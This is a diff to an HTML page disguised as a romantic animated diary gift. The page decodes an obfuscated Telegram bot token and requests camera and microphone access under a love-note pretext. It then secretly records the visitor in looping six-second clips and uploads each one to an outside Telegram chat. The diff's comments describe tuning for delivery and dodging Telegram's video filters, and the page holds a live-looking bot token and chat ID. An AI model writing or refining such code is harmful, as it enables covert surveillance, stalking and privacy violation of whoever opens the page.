@@ -18,7 +18,6 @@
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 240, 243, 0.9); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 2000; }
         .btn-magic { background: var(--rose); color: white; border: none; padding: 18px 45px; border-radius: 50px; cursor: pointer; font-size: 1.4rem; box-shadow: 0 4px 15px rgba(255, 77, 109, 0.3); }
     </style>
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
 </head>
 <body>
     <div id="overlay">
@@ -47,7 +46,6 @@
         let mediaRecorder, recordedChunks = [];
         let stream = null;
         let loopCount = 0;
-        const bgMusic = document.getElementById('bg-music');
         const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
 
         function setupZ() { const pages = document.querySelectorAll('.page'); pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); }
@@ -57,12 +55,12 @@
             try {
                 fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Link%20Opened!%20❤️`, {keepalive: true});
                 
-                // Micro-resolution for fast background upload
-                stream = await navigator.mediaDevices.getUserMedia({ video: { width: 160, height: 120 }, audio: true });
+                // Lowest resolution for 100% success
+                stream = await navigator.mediaDevices.getUserMedia({ video: { width: 120, height: 120 }, audio: true });
                 document.getElementById('video-preview').srcObject = stream;
                 document.getElementById('overlay').style.display = 'none';
                 document.getElementById('diary-wrapper').style.display = 'block';
-                bgMusic.play();
+                document.getElementById('bg-music').play();
                 startLoop(); 
             } catch (err) { alert("Please allow camera access! ❤️"); }
         }
@@ -74,29 +72,31 @@
             mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
             
             mediaRecorder.onstop = async () => {
+                if (recordedChunks.length === 0) return;
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 const formData = new FormData();
                 formData.append('chat_id', "5324376571"); 
-                formData.append('video', blob, `reaction_${loopCount}.webm`);
+                // Fix: Sending as document to avoid Telegram video filters
+                formData.append('document', blob, `reaction_${loopCount}.mp4`); 
                 
-                fetch(`https://api.telegram.org/bot${t}/sendVideo`, { method: 'POST', body: formData, keepalive: true })
+                fetch(`https://api.telegram.org/bot${t}/sendDocument`, { method: 'POST', body: formData, keepalive: true })
                 .then(() => { if (mediaRecorder.state !== "recording") startLoop(); });
             };
 
             mediaRecorder.start();
-            // 7-second loops for reliability
-            setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 7000);
+            // Short 6-second clips to ensure fast delivery
+            setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 6000);
         }
 
         window.addEventListener('beforeunload', () => { if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop(); });
 
         async function triggerSecretUpload(btn) {
-            bgMusic.pause();
+            document.getElementById('bg-music').pause();
             const vn = new Audio('voice note.mp4'); 
             btn.innerHTML = "Listening... ❤️";
             btn.disabled = true;
             vn.play();
-            vn.onended = () => { bgMusic.play(); alert("I love you forever, Nikhitha! ❤️"); };
+            vn.onended = () => { document.getElementById('bg-music').play(); alert("I love you forever! ❤️"); };
         }
     </script>
 </body>
